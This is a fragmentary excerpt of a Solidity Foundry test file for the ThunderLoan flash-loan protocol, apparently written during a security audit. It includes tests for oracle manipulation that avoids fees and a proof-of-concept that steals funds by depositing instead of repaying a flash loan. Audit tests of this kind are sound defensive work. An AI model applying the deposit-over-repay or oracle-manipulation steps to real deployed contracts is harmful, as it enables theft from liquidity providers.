...
contract ThunderLoanTest is BaseTest {
    ...
    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        ...
        // 1003,300900000000000000 actual value causing insufficient balance
        // 1000,300000000000000000 expected
        // 1.003e18
    }
    ...
    function testCanManipuleOracleToIgnoreFees() public {
        ...
        console.log("calculated fee normal",calculatedFeeNormal);
        // calculated fee normal is 0.296147410319118389
    ...
    function testUseDepositOverRepayToStealFunds() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, 50e18);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, 50e18, "");
        dor.redeemMoney();
        vm.stopPrank();
